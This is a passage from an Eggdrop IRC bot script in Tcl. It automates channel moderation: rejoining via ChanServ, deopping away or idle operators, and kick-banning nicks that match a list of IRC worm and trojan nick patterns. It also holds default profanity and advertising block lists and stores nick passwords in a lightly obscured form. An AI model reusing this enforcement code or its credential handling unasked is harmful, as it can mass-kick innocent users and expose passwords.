  putlog "CANT SEND ON [lindex $arg 1] MODERaTE!"
  if {[isutimer "del_nobase"]} { catch { clearqueue all } ; foreach x [utimers] { if {[string match "*del_nobase*" $x]} { killutimer [lindex $x 2] ; utimer 1 del_nobase } } }
}
bind raw - 473 ch_invite
proc ch_invite {from keyword arg} {
  global double joinme notc 
  set chan [lindex $arg 1]
  if {$double == 0} {
    if {$joinme != ""} { puthlp "NOTICE $joinme :$notc $chan 4(+I)" }
    putsrv "ChanServ invite $chan" ; set double 1 ; return 0
  }
  if {$double == 1} {
    if {[string match "*+statuslog*" [channel info $chan]]} {
      if {$joinme != ""} { puthlp "NOTICE $joinme :$notc ReMOVE $chan 4(+I)" }
      channel remove $chan ; savechan
    }
    set joinme "" ; set double 0
  }
  return
}
bind pub m `scan pub_scan
proc pub_scan {nick uhost hand chan arg} {
   global botnick
   foreach nick [chanlist $chan] {
      if {$nick == $botnick} { continue }
      if {[matchattr $nick f]} { continue }
      if {[isop $nick $chan]} {
         whoisq $nick
         putserv "WHOIS $nick"
      }
   }
}
bind time - "12 * * * *" scanning
bind time - "42 * * * *" scanning
proc scanning {min hour day month year} {
   global botnick unidentifyop
   foreach chan [channels] {
      if {![isop $botnick $chan]} { return 0 }
      if {[string match "*+unidentifyop*" [channel info $chan]]} { 
         putserv "PRIVMSG $chan :\001ACTION ((((S.c.a.n.i.n.g)))) \001"
      }
      foreach nick [chanlist $chan] {
         if {$nick == $botnick} { continue }
         if {[matchattr $nick f]} { continue }
         if {[isop $nick $chan]} {
            whoisq $nick
            putserv "WHOIS $nick"
         }
      }
   }
}
bind raw - 301 raw:swi_wi301
proc raw:swi_wi301 {from key arg} {
   global botnick 
   foreach chan [channels] {
      set cflag "c$chan"
      set cflag [string range $cflag 0 8]
      set nick [lindex [split $arg] 1]
      if {$nick == $botnick} { return 0 }
      if {[matchattr $nick f]} { return 0 }
      if {[string match "*+noawayop*" [channel info $chan]]} {
         if {[isop $nick $chan]} {
            set awaymessage [string trimleft [join [lrange [split $arg] 2 end]] :]
            putlog "Log $nick is Away : $awaymessage"
            if {[string match "*t.¢*" [uncolor $awaymessage]]} { 
               putlog "!Log! PaSs This bOt"
               return 0 
            }
            if {![string match "*k*" [getchanmode $chan]]} {
               
               putserv "MODE $chan -ko+v 14n4o.14a4waY.14@4p $nick $nick"
            } {
               putserv "MODE $chan -o+v $nick $nick"
            }
         }
      }
   }
}
bind raw - 317 raw:swi_wi317
proc raw:swi_wi317 {from key arg} {
   foreach chan [channels] {
      set cflag "c$chan"
      set cflag [string range $cflag 0 8]
      set nick [lindex [split $arg] 1]
      set idletime [lindex [split $arg] 2]
      if {[matchattr $nick f]} { return 0 }
      if {[string match "*+idleop*" [channel info $chan]]} { 
         if {[isop $nick $chan]} { 
            if {$idletime > [getuser $cflag XTRA "IDLE"]} { 
               if {![string match "*k*" [getchanmode $chan]]} {
                  putserv "MODE $chan -ko+v 14n4o.14i4dLe.14@4p $nick $nick" 
               } {
                  putserv "MODE $chan -o+v $nick $nick"
               }
            }
         }
      }
   }
}
proc swi_wibindall { } {
   bind raw - 301 raw:swi_wi301
   bind raw - 317 raw:swi_wi317
}
proc swi_wiunbindall { } {
   unbind raw - 301 raw:swi_wi301
   unbind raw - 317 raw:swi_wi317
}
bind raw - 474 ch_banned
proc ch_banned {from keyword arg} {
  global double joinme notc 
  set chan [lindex $arg 1]
  if {$double == 0} {
    if {$joinme != ""} { puthlp "NOTICE $joinme :$notc $chan 4(+B)" }
    putsrv "ChanServ invite $chan" ; puthlp "ChanServ unban $chan"
    set double 1 ; return 0
  }
  if {$double == 1} {
    if {[string match "*+statuslog*" [channel info $chan]]} {
      if {$joinme != ""} { puthlp "NOTICE $joinme :$notc ReMovE $chan 4(+B)" }
      putsrv "ChanServ invite $chan" ; channel remove $chan ; savechan
    }
    set joinme "" ; set double 0
  }
  return 0
}
bind raw - 475 ch_key
proc ch_key {from keyword arg} {
  global double joinme notc lastkey
  set chan [lindex $arg 1]
  set cflag "c$chan"
  set cflag [string range $cflag 0 8]
  if {$double == 0} {
    if {$joinme != ""} { puthlp "NOTICE $joinme :$notc $chan 4(+K)" }
    if {[matchattr $cflag K]} { puthlp "JOIN $chan :[dezip [getuser $cflag XTRA "CI"]]" } { puthlp "JOIN $chan" }
    if {[info exists lastkey]} { puthlp "JOIN $chan :$lastkey" }
    set double 1 ; return 0
  }
  if {$double == 1} {
    if {[string match "*+statuslog*" [channel info $chan]]} {
      if {$joinme != ""} { puthlp "NOTICE $joinme :$notc ReMovE $chan 4(+K)" }
      channel remove $chan ; savechan ; return 0
    }
    if {[string tolower $chan]} { putsrv "ChanServ invite $chan" }
    set joinme "" ; set double 0
  }
  return 0
}
bind raw - 478 ch_full
proc ch_full {from keyword arg} {
  global double joinme notc botnick
  set chan [lindex $arg 1]
  if {[isop $botnick $chan]} {
    set bans "" ; set i 0
    foreach x [chanbans $chan] { if {$i < 5} { append bans " [lindex $x 0]" ; set i [incr i] } }
    putserv "MODE $chan -kbbbbb 14b4an.14l4ist.14f4ull $bans"
    return 0
  }
  if {$double == 0} {
    if {$joinme != ""} { puthlp "NOTICE $joinme :$notc $chan 4(+L)" }
    putsrv "ChanServ invite $chan" ; set double 1 ; return 0
  }
  if {$double == 1} {
    if {[string match "*+statuslog*" [channel info $chan]]} {
      if {$joinme != ""} { puthlp "NOTICE $joinme :$notc ReMOVE $chan 4(+L)" }
      channel remove $chan ; savechan
    }
    set joinme "" ; set double 0
  }
  return 0
}
if {$altnick == ""} { set altnick [randstring 7] }
set badwords ""
set advwords ""
proc config {} {
  global nick nickpass altpass altnick realname owner kops my-ip banner awaybanner
  global notc notm logstore cfgfile badwords advwords ban-time my-hostname kickclr kcounter
  if {[validuser "config"]} {
    if {[getuser "config" XTRA "REALNAME"]!=""} { set realname [dezip [getuser "config" XTRA "REALNAME"]] } else { set realname [realnames] }
    if {[getuser "config" XTRA "USERNAME"]!=""} { set realname [dezip [getuser "config" XTRA "USERNAME"]] }
    if {[getuser "config" XTRA "NICK"]!=""} { set nick [dezip [getuser "config" XTRA "NICK"]] }
    if {[getuser "config" XTRA "NICKPASS"]!=""} { set nickpass [dezip [getuser "config" XTRA "NICKPASS"]] }
    if {[getuser "config" XTRA "ALTNICK"]!=""} { set altnick [dezip [getuser "config" XTRA "ALTNICK"]] }
    if {[getuser "config" XTRA "ALTPASS"]!=""} { set altpass [dezip [getuser "config" XTRA "ALTPASS"]] }
    if {[getuser "config" XTRA "BAN"]!=""} { set notc [dezip [getuser "config" XTRA "BAN"]] }
	if {[getuser "config" XTRA "ODON"]!=""} { set awaybanner [dezip [getuser "config" XTRA "ODON"]] }
    if {[getuser "config" XTRA "BANTIME"]!=""} { set ban-time [getuser "config" XTRA "BANTIME"] }
    if {[getuser "config" XTRA "BADWORDS"]!=""} { set badwords [getuser "config" XTRA "BADWORDS"] }
    if {$badwords == ""} {
      set badwords "celek pejuh itil kelentit cibai kimak memek kontol bangsat entot fuck peler vagina ngewe"
      setuser "config" XTRA "BADWORDS" $badwords
    }
    if {[getuser "config" XTRA "ADVWORDS"]!=""} { set advwords [getuser "config" XTRA "ADVWORDS"] }
    if {$advwords == ""} {
      set advwords "http:// ftp:// klik click .com .net .org .us .cn .uk .il .biz .info .tk .us"
      setuser "config" XTRA "ADVWORDS" $advwords
    }
    if {[getuser "config" XTRA "KOPS"]!=""} { set kops "T" }
    if {[getuser "config" XTRA "KCLR"]!=""} { set kickclr "T" } 
    if {[getuser "config" XTRA "VHOST"]!=""} { set my-hostname [getuser "config" XTRA "VHOST"] ; set my-ip [getuser "config" XTRA "VHOST"] }
    if {[getuser "config" XTRA "LOGCHAN"]!=""} {
      putlog "$notc CReaTING LOG FiLE <<[getuser "config" XTRA "LOGCHAN"]>>"
      set logstore "${cfgfile}.log"
      logfile jpk [getuser "config" XTRA "LOGCHAN"] $logstore 
    }
  } else { adduser "config" "" ; chattr "config" "-hp" }
  foreach x [userlist] { chattr $x -Q ; if {$x != "config" && $x != "AKICK" && $x != "DEAD"} { foreach y [getuser $x HOSTS] { delhost $x $y } ; set hostmask "${x}!*@*" ; setuser $x HOSTS $hostmask } }
  if {![validuser "AKICK"]} { set hostmask "telnet!*@*" ; adduser "AKICK" $hostmask ; chattr "AKICK" "-hp" ; chattr "AKICK" "K" }
  if {![validuser "DEAD"]} { set hostmask "telnet!*@*" ; adduser "DEAD" $hostmask ; chattr "DEAD" "-hp" ; chattr "DEAD" "D" }
  if {![validuser $owner]} { set hostmask "$owner!*@*" ; adduser $owner $hostmask ; chattr $owner "Zfhjmnoptx" }
  saveuser
}
utimer 1 {config}
utimer 2 {seen}
## public trojan auto kick -- start
bind pub Z `+trojan pub_+trojan
setudef flag trojan
proc pub_+trojan {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[string match "*+trojan*" [channel info $chan]]} { puthelp "NOTICE $nick :$notc $chan 4ReADY!!" ; return 0 }
  catch { channel set $chan +trojan }
  puthelp "NOTICE $nick :$notc trojan Nick Kick (@) & Report $chan \[9ON\]"
  saveuser
}
bind pub Z `-trojan pub_-trojan
proc pub_-trojan {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[string match "*-trojan*" [channel info $chan]]} { puthelp "NOTICE $nick :$notc trojan Nick Kick (@) & Report $chan already 4DISaBLE." ; return 0 }
  catch { channel set $chan -trojan }
  puthelp "NOTICE $nick :$notc trojan Nick Kick (@) & Report $chan \[4Off\]"
  saveuser
}
set banmasktro {
  "Aldora*" "Alysia*" "Amorita*" "Anita*" "April*" "Ara*" "Aretina*" "Barbra*" "Becky*" "Bella*" "Bettina*" "Blenda*" "Briana*" "Bridget*" "Caitlin*" "Camille*" "Cara*" "*Jolyanne*"
  "Carmen*" "Chelsea*" "Clarissa*" "Damita*" "Danielle*" "Daria*" "Diana*" "Donna*" "Dora*" "Doris*" "Ebony*" "Eden*" "Eliza*" "Emily*" "Erika*" "Eve*" "Zoe*" "Zenia*"
  "Evelyn*" "Faith*" "Fisher*" "Gale*" "Gilda*" "Gloria*" "grod0lf*" "Haley*" "Helga*" "Holly*" "Hunter*" "Ida*" "Idona*" "Iris*" "Iyana*" "Isabel*" "Ivana*" "Ivory*" "Carla*" "Clari*" "Zilya*" 
  "Janet*" "Jewel*" "Joanna*" "Julie*" "Juliet*" "Kacey*" "Kali*" "Kara*" "Kassia*" "Katrina*" "Kyle*" "Lara*" "Laura*" "Linda*" "Lisa*" "Lolita*" "Lynn*" "Maia*" 
  "Mary*" "Melody*" "Mimi*" "Myra*" "Nadia*" "Naomi*" "Natalie*" "Nicole*" "Nina*" "Nora*" "Nova*" "Olga*" "Olivia*" "Pamela*" "Peggy*" "Queen*" "Rachel*" "Rae*"
  "Rita*" "Rosa*" "Ruby*" "Sharon*" "Silver*" "Ula*" "Uma*" "Valda*" "Valora*" "Vanessa*" "Vicky*" "Violet*" "Vivian*" "Wendy*" "Willa*" "Xandra*" "Xenia*" "Xylia*"  
}
proc trojanchk {nick bmask_check bmask_host chan} {
  global banmasktro tjidx notc
  set nick1 [string index $nick [expr [string length $nick] -1]]
  set nick2 [string index $nick [expr [string length $nick] -2]]
  foreach bmask $banmasktro {
    if {[string index $bmask_check 0] == "~"} { putlog "worm halted" ; return 0 }
    if {[string match $bmask $bmask_check] && [isnumber $nick1] && [isnumber $nick2]} { if {[botisop $chan]} { if {$tjidx == 9} { set tjidx 1 } ; trojankick $nick $bmask_host $chan } }
} }
set tjidx 1
proc trojankick {nick bmask_host chan} {
  global tjidx notc bannick botnick
  set bannick($nick) "$bmask_host"
  if {$tjidx == 1} { putserv "KICK $chan $nick :$notc 14w324@14dref-d4/14trojan4/14ircworm deteçted [banmsg]"
    } elseif {$tjidx == 2} { putserv "KICK $chan $nick :$notc 14Email-Worm.4Win3214.Drefir.f4/14trojan4/14ircworm deteçted [banmsg]"
    } elseif {$tjidx == 3} { putserv "KICK $chan $nick :$notc 14w324@14drefir.D4/14trojan4/14ircworm deteçted [banmsg]"
    } elseif {$tjidx == 4} { putserv "KICK $chan $nick :$notc 14w324@14drefir.E4/14trojan4/14ircworm deteçted [banmsg]"
    } elseif {$tjidx == 5} { putserv "KICK $chan $nick :$notc 14w324@14drefir.F4/14trojan4/14ircworm deteçted [banmsg]"
    } elseif {$tjidx == 6} { putserv "KICK $chan $nick :$notc 14you're infected with IRC trojan virus. goto http://www.nohack.com for help [banmsg]"
    } elseif {$tjidx == 7} { putserv "KICK $chan $nick :$notc 14w324@14drefir.worm.gen4/14trojan4/14ircworm deteçted [banmsg]"
    } elseif {$tjidx == 8} { putserv "KICK $chan $nick :$notc 14w324@14drefir.f.worm4/14trojan4/14ircworm deteçted [banmsg]"
    } elseif {$tjidx == 9} { putserv "KICK $chan $nick :$notc 14drefir.4f4/14trojan4/14ircworm deteçted [banmsg]"
    set tjidx 0
  }
  incr tjidx
  return 0
}
## public trojan auto kick -- stop
## public echoX auto kick -- start
bind pub Z `+echox pub_+echox
setudef flag echox
proc pub_+echox {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[string match "*+echox*" [channel info $chan]]} { puthelp "NOTICE $nick :$notc $chan 4ReADY!!" ; return 0 }
  catch { channel set $chan +echox }
  puthelp "NOTICE $nick :$notc echoX Nick Kick $chan \[9ON\]"
  saveuser
}
bind pub Z `-echox pub_-echox
proc pub_-echox {nick uhost hand chan rest} {
  global notc
  if {![matchattr $nick Q]} { puthelp "NOTICE $nick :$notc 4DeNiEd..!" ; return 0 }
  if {[string match "*-echox*" [channel info $chan]]} { puthelp "NOTICE $nick :$notc echoX Nick Kick $chan already 4DISaBLE." ; return 0 }
  catch { channel set $chan -echox }
  puthelp "NOTICE $nick :$notc echoX Nick Kick $chan \[4Off\]"
  saveuser
}
set echonick {
"Aake" "aaren" "aarika" "ab" "Aba" "abagael" "abagail" "abba" "abbe" "abbe" "abbey" "abbi" "abbie" "abbie" "abbot" "abbott" "abby" "abby" "abbye" "Abdalla" "abdel" "Abdo" "abdul" "abe" "abel" "abelard" "abeu" "abey" "Abha" "abie" "abigael" "abigail" "abigale" "Abner" "abner" "abra" "abraham" "abrahan" "abram" "abramo" "abran" "Achiya" "ad" "ada" "adah" "adair" "adaline" "adam" "adamo" "adams" "adan" "adan" "adara" "adda" "addi" "addia" "addie" "addie" "addison" "addy" "addy" "ade" "Adel" "adel" "adela" "adelaida" "adelaide" "adelbert" "adele" "adelheid" "adelice" "adelina" "adelind" "adeline" "adella" "adelle" "adena" "adey" "adham" "adi" "adiana" "adina" "adlai" "adler" "ado" "adolf" "adolph" "adolphe" "adolpho" "adolphus" "adora" "adore" "adoree" "adorne" "adrea" "adria" "adriaens" "adrian" "adrian" "adriana" "adriane" "adrianna" "adrianne" "adriano" "adrien" "adriena" "Adrienne" "adrienne" "aeriel" "aeriela" "aeriell" "afton" "ag" "agace" "agata" "agatha" "agathe" "aggi" "aggie" "aggy" "agna" "agnella" "agnes" "agnese" "agnesse" "agneta" "agnola" "agosto" "agretha" "aguie" "aguistin" "aguste" "agustin" "aharon" "ahmad" "Ahmed" "ahmed" "aida" "aidan" "aigneis" "aila" "ailbert" "aile" "ailee" "aileen" "ailene" "ailey" "aili" "ailina" "ailis" "ailsun" "ailyn" "Aime" "aime" "aimee" "aimil" "aindrea" "ainslee" "ainsley" "ainslie" "ajay" "Ajit" "Ajmone" "akim" "aksel" "al" "Alai" "alain" "alaine" "alair" "alameda" "alan" "alana" "alanah" "aland" "alane" "alanna" "alano" "alanson" "alard" "alaric" "alasdair" "Bob" "alastair" "alasteir" "alaster" "alayne" "alberik" "albert" "alberta" "albertina" "albertine" "alberto" "albie" "albina" "albrecht" "Alchian" "Alcinda" "alden" "aldin" "aldis" "aldo" "aldon" "aldous" "aldric" "aldrich" "aldridge" "aldus" "aldwin" "alec" "alecia" "aleda" "aleece" "aleen" "alejandra" "alejandrina" "Alejandro" "alejandro" "alejoa" "aleksandr" "Alekseevich" "alena" "alene" "alessandra" "alessandro" "aleta" "alethea" "alex" "alex" "alexa" "alexander" "alexandr" "alexandra" "alexandre" "alexandrina" "alexandro" "Alexandros" "alexandros" "alexei" "alexi" "alexia" "alexina" "alexine" "alexio" "alexis" "alexis" "alf" "alfi" "alfie" "alfie" "alfons" "alfonse" "alfonso" "alford" "alfred" "alfreda" "alfredo" "alfy" "alfy" "algernon" "ali" "ali" "alia" "Ali-Amidi" "Alic" "alic" "alica" "alice" "alicea" "alicia" "alick" "alida" "alidia" "alie" "alika" "alikee" "alina" "aline" "Alireza" "alis" "alisa" "alisander" "alisha" "alison" "alissa" "alistair" "alister" "alisun" "alix" "alix" "aliza" "alvarez" "alla" "allan" "allard" "allayne" "alleen" "allegra" "allen" "allene" "alley" "alleyn" "alli" "allianora" "allie" "allie" "allin" "allina" "allis" "allison" "allissa" "allister" "allistir" "allix" "allsun" "allx" "ally" "allyce" "Allyn" "allyn" "allyn" "allys" "allyson" "alma" "almeda" "almeria" "almeta" "almira" "almire" "Aloha" "aloin" "aloise" "aloisia" "Alok" "alon" "alonso" "alonzo" "aloysia" "aloysius" "alphard" "alphonse" "alphonso" "alric" "alta" "althea" "aluin" "aluino" "Alula" "alva" "alvan" "alvera" "alverta" "alvie" "alvin" "alvina" "alvinia" "alvira" "alvis" "alvy" "$alwin" "$alwyn" "alyce" "alyda" "alyosha" "alys" "alysa" "alyse" "alysia" "alyson" "alyss" "alyssa" "amabel" "amabelle" "amalea" "amalee" "amaleta" "amalia" "amalie" "amalita" "amalle" "amanda" "amandi" "amandie" "amandy" "amara" "amargo" "Amari" "Amartya" "amata" "amber" "amberly" "amble" "ambros" "ambrose" "ambrosi" "ambrosio" "ambrosius" "ambur" "amby" "ame" "amelia" "amelie" "amelina" "ameline" "amelita" "amerigo" "amery" "ami" "Amidi" "amie" "amii" "amil" "Amita" "Amitai" "amitie" "amity" "ammamaria" "Ammar" "Ammon" "Ammoura" "Amode" "amory" "amos" "Amrane" "Amrutbhal" "amy" "amye" "ana" "anabal" "anabel" "anabella" "anabelle" "analiese" "analise" "anallese" "anallise" "Anany" "anastasia" "anastasie" "anastassia" "anatol" "anatola" "anatole" "Anatolij" "anatollo" "ancell" "Andee" "andee" "andeee" "anderea" "anders" "anderson" "andi" "andie" "andie" "andonis" "andra" "andras" "andre" "andrea" "andrea" "andreana" "andreas" "andree" "andrei" "andrej" "andres" "andrew" "andrews" "andrey" "andria" "andriana" "andriette" "andris" "andromache" "andros" "andrus" "Andrzej" "andy" "andy" "anestassia" "anet" "anett" "anetta" "anette" "ange" "ange" "angel" "angel" "angela" "angele" "angeli" "angelia" "angelica" "angelico" "Angelika" "angelina" "angeline" "angelique" "Ben-chieh" "bendick" "bendicty" "bendite" "bendix" "benedetta" "benedetto" "benedick" "benedict" "benedicta" "benedicto" "benedikt" "benedikta" "Benedykt" "cordell" "cordey" "cordi" "cordie" "cordie" 
"angelita" "angelle" "angelo" "angie" "angie" "angil" "angus" "angy" "ania" "anica" "anissa" "anita" "Anitra" "anitra" "anjanette" "anjela" "An-loh" "Anlu" "ann" "anna" "annabal" "annabel" "annabela" "annabell" "annabella" "annabelle" "annadiana" "anna-diana" "annadiane" "anna-diane" "annalee" "annaliese" "annalise" "annamaria" "anna-maria" "annamarie" "anne" "annecorinne" "anne-corinne" "anneliese" "annelise" "annemarie" "anne-marie" "annetta" "annette" "anni" "Annibale" "annice" "Annie" "annie" "Annikki" "annis" "annissa" "annmaria" "annmarie" "ann-marie" "annnora" "annora" "anny" "ansel" "ansell" "anselm" "anselma" "ansley" "anson" "anstice" "Antanas" "anthe" "anthea" "anthia" "anthiathia" "anthony" "antin" "antoine" "antoinette" "Anton" "anton" "antone" "antonella" "antonetta" "antoni" "antonia" "antonie" "antonietta" "antonin" "antonina" "antonino" "antonio" "antonius" "antons" "Antony" "antony" "Anupam" "Anurag" "Anurup" "Anuska" "any" "anya" "Anyue" "Appie" "appolonia" "april" "aprilette" "ara" "ara" "arabel" "arabela" "arabele" "arabella" "arabelle" "araldo" "Arbind" "Arcarons" "Arcas" "arch" "archaimbaud" "archambault" "archer" "archibald" "archibaldo" "archibold" "archie" "archy" "arda" "ardath" "ardeen" "ardelia" "ardelis" "ardella" "ardelle" "arden" "ardene" "ardenia" "ardine" "ardis" "ardisj" "ardith" "ardra" "ardyce" "ardys" "ardyth" "Are" "Aref" "arel" "aretha" "ari" "ariadne" "ariana" "aridatha" "arie" "ariel" "ariel" "ariela" "ariella" "arielle" "Arilee" "arin" "ario" "aristotle" "Arjang" "arlan" "arlana" "arlee" "arleen" "arlen" "arlen" "arlena" "arlene" "arleta" "arlette" "arley" "arleyne" "arlie" "arliene" "arlin" "arlina" "arlinda" "arline" "arluene" "arly" "arlyn" "arlyne" "arman" "armand" "armando" "armin" "armstrong" "arnaldo" "arne" "arney" "arni" "arnie" "arnold" "arnoldo" "arnuad" "arny" "aron" "arri" "arron" "art" "artair" "arte" "artemas" "artemis" "artemus" "arther" "Arthur" "arthur" "artie" "artur" "arturo" "artus" "arty" "Arunabha" "Arunachalam" "arv" "Arved" "arvie" "arvin" "arvy" "Aryeh" "aryn" "asa" "ase" "Asghar" "ash" "ashbey" "ashby" "ashely" "asher" "ashia" "ashien" "ashil" "ashla" "ashlan" "ashlee" "ashleigh" "ashlen" "ashley" "ashley" "ashli" "ashlie" "ashlin" "ashly" "ashton" "asia" "Asmund" "astra" "astrid" "astrix" "atalanta" "athena" "athene" "atlanta" "atlante" "Attahiru" "aube" "auberon" "aubert" "auberta" "aubine" "aubree" "aubrette" "aubrey" "aubrey" "aubrie" "aubry" "audi" "audie" "audra" "audre" "audrey" "audrie" "audry" "audrye" "audy" "augie" "august" "augusta" "auguste" "augustin" "augustina" "Augustine" "augustine" "augustine" "augusto" "augustus" "augy" "aundrea" "aura" "aurea" "aurel" "aurelea" "aurelia" "aurelie" "auria" "aurie" "aurilia" "aurlie" "auroora" "aurora" "aurore" "aurthur" "austen" "austin" "austin" "austina" "austine" "ava" "ave" "Avedis" "aveline" "averell" "averil" "averil" "Averill" "averill" "avery" "averyl" "avictor" "avie" "avigdor" "Avijit" "avis" "avila" "aviva" "avivah" "Avner" "avram" "avril" "avrit" "avrom" "ax" "axe" "axel" "aylmar" "aylmer" "aymer" "ayn" "Azza" "bab" "babara" "babb" "babbette" "babbie" "babette" "babita" "babs" "Badri" "baker" "Baerbel" "Bagher" "bail" "bailey" "bailie" "baillie" "baily" "baird" "Balasamy" "bald" "balduin" "baldwin" "bale" "bambi" "bambie" "bamby" "ban" "bancroft" "bank" "banky" "Baoguang" "bar" "barb" "Barba" "barbabas" "barbabra" "barbara" "barbaraanne" "barbara-anne" "barbe" "barbee" "barbette" "barbey" "barbi" "barbie" "barbra" "barby" "barclay" "bard" "barde" "bari" "barn" "barnes" "barnabas" "barnabe" "barnaby" "barnard" "barnebas" "barnett" "barney" "barnie" "barny" "baron" "barr" "barret" "barrett" "barri" "barrie" "barrie" "barris" "barron" "barry" "barry" "Bart" "bart" "bartel" "barth" "barthel" "bartholemy" "bartholomeo" "bartholomeus" "bartholomew" "bartie" "bartlet" "bartlett" "bartolemo" "bartolomeo" "barton" "bartram" "barty" "bary" "baryram" "batam" "Basar" "base" "Basia" "basia" "basil" "basile" "basilio" "basilius" "bastian" "bastien" "bat" "batholomew" "bathsheba" "batsheva" "baudoin" "bax" "baxie" "baxter" "baxy" "bay" "bayard" "Bayraktar" "bea" "beale" "bealle" "Bean-San" "bear" "bearnard" "Beat" "Beate" "beatrice" "beatrisa" "beatrix" "beatriz" "beau" "beaufort" "beauregard" "bebe" "becca" "beck" "becka" "becki" "beckie" "becky" "bee" "beilul" "beitris" "bekki" "bel" "belia" "belicia" "Belinda" "belinda" "belita" "bell" "bella" "bellanca" "belle" "bellina" "beltran" "belva" "belvia" "ben" "Bencheng" "sutton" "suzann" "suzanna" "suzanne" "suzette" "suzi" "suzie" "suzy" "sven" "svend" "Sven-Olof"
"benetta" "bengt" "beniamino" "benita" "benito" "benjamen" "Benjamin" "benjamin" "benji" "benjie" "benjy" "benn" "bennett" "benni" "bennie" "bennie" "benny" "benny" "benoit" "benoite" "Benot" "benson" "bent" "bentlee" "bentley" "benton" "Bentson" "benyamin" "Ben-Zion" "ber" "berenice" "beret" "berget" "berk" "berke" "berkeley" "berkie" "berkley" "berkly" "berky" "bern" "berna" "bernadene" "bernadette" "bernadina" "bernadine" "Bernard" "bernard" "bernardina" "bernardine" "bernardo" "Bernarr" "bernarr" "Berndt" "berne" "Bernell" "bernelle" "bernete" "bernetta" "bernette" "bernhard" "berni" "Bernice" "bernice" "bernie" "bernie" "bernita" "Bernstein" "berny" "berny" "berri" "berrie" "berry" "bert" "bert" "berta" "berte" "bertha" "berthe" "berti" "berti" "bertie" "bertie" "bertina" "bertine" "berton" "bertram" "bertrand" "bertrando" "berty" "berty" "beryl" "beryle" "bess" "bessie" "bessy" "beth" "bethanne" "bethany" "bethena" "bethina" "betsey" "betsy" "betta" "Bette" "bette" "betteann" "bette-ann" "betteanne" "betti" "Bettina" "bettina" "bettine" "betty" "bettye" "beulah" "Bev" "bev" "bev" "bevan" "beverie" "beverlee" "beverley" "beverlie" "beverly" "bevin" "bevon" "bevvy" "bianca" "bianka" "bibbie" "bibby" "bibbye" "bibi" "biddie" "biddy" "bidget" "bil" "bili" "bill" "bill" "billi" "billie" "billie" "billy" "billy" "billye" "Bing" "bing" "Bingzhang" "bink" "binky" "binni" "binnie" "binny" "birch" "bishop" "bird" "birdie" "birgit" "birgitta" "birk" "biron" "Bisha" "bjorn" "blaine" "blair" "blair" "blaire" "Blake" "blake" "blake" "blakelee" "blakeley" "blanca" "blanch" "blancha" "blanche" "blane" "Blas" "blayne" "blinni" "blinnie" "blinny" "bliss" "blisse" "blithe" "blondell" "blondelle" "blondie" "blondy" "blythe" "bo" "bobbe" "bobbee" "bobbette" "bobbi" "bobbie" "bobbie" "bobby" "bobby" "bobbye" "bobette" "bobina" "bobine" "bobinette" "Bock" "bogart" "bogey" "boigie" "bond" "bondie" "bondon" "bondy" "bone" "boniface" "bonita" "bonnee" "bonni" "bonnibelle" "bonnie" "bonny" "Bonson" "Boo" "Boonchai" "boone" "boonie" "boony" "boot" "boote" "booth" "boothe" "Boo-Yau" "Bor-Chung" "bord" "borden" "bordie" "bordy" "borg" "boris" "Boujema" "bourke" "bowie" "boy" "boyce" "boycey" "boycie" "boyd" "brad" "bradan" "brade" "braden" "bradford" "bradley" "bradly" "bradney" "brady" "Brahmanand" "bram" "bran" "brana" "brand" "brandais" "brande" "brandea" "branden" "brander" "brandi" "brandice" "brandie" "brandise" "brandon" "brandtr" "brandy" "brandy" "brandyn" "brannon" "brant" "brantley" "breanne" "brear" "bree" "breena" "bren" "bren" "brena" "Brenda" "brenda" "brendan" "brenden" "brendin" "brendis" "brendon" "brenn" "brenna" "brennan" "brennen" "brent" "Brenton" "bret" "brett" "brett" "brew" "brewer" "brewster" "bria" "brian" "briana" "brianna" "brianne" "briano" "briant" "brice" "bride" "bridget" "bridgette" "bridie" "brien" "brier" "brietta" "brig" "brigg" "briggs" "brigham" "brigid" "brigida" "brigit" "brigitta" "brigitte" "brina" "briney" "brinn" "brinna" "briny" "brion" "brit" "brit" "brita" "britney" "britni" "britt" "britt" "britta" "brittan" "brittaney" "brittani" "brittany" "britte" "britteny" "brittne" "brittney" "brittni" "brnaba" "brnaby" "brock" "brockie" "brocky" "brod" "broddie" "broddy" "Broder" "broderic" "broderick" "brodie" "brody" "brok" "bron" "bronnie" "bronny" "bronson" "brook" "brooke" "Brooks" "brown" "brooks" "brose" "bruce" "brucie" "bruis" "Brunero" "brunhilda" "brunhilde" "bruno" "bryan" "bryana" "bryant" "bryanty" "bryce" "bryn" "bryn" "bryna" "brynn" "brynna" "brynne" "bryon" "Bryson" "buck" "buckie" "bucky" "bud" "budd" "buddie" "buddy" "buffy" "buiron" "Bui-Trong-Lieu" "bunni" "bunnie" "bunny" "burch" "burg" "burgess" "burk" "burke" "burl" "burlie" "burnaby" "burnard" "burr" "Burt" "burt" "burtie" "butler" "burton" "burty" "Bush" "butch" "Byeong-Yun" "byram" "byran" "byrann" "byrle" "byrom" "byron" "cacilia" "cacilie" "cad" "caddric" "caesar" "cahra" "Cai" "cairistiona" "caitlin" "caitrin" "Cal" "cal" "cal" "caldwell" "cale" "caleb" "calhoun" "calida" "calla" "callean" "calley" "calli" "callida" "callie" "cally" "calv" "calvin" "calypso" "cam" "cam" "camala" "camel" "camella" "camellia" "cameron" "camey" "cami" "camila" "camile" "camilla" "camille" "cammi" "cammie" "cammy" "cammy" "campbell" "candace" "candi" "candice" "candida" "candide" "candie" "candis" "candra" "Candy" "candy" "caprice" "car" "cara" "caralie" "carce" "care" "caren" "carena" "caresa" "caressa" "caresse" "carey" "carey" "cari" "caria" "carie" "caril" "carilyn" "carin" "carina" "carine" "cariotta" "carissa" "carita" "caritta" "carl" "carlson" "cordula" 
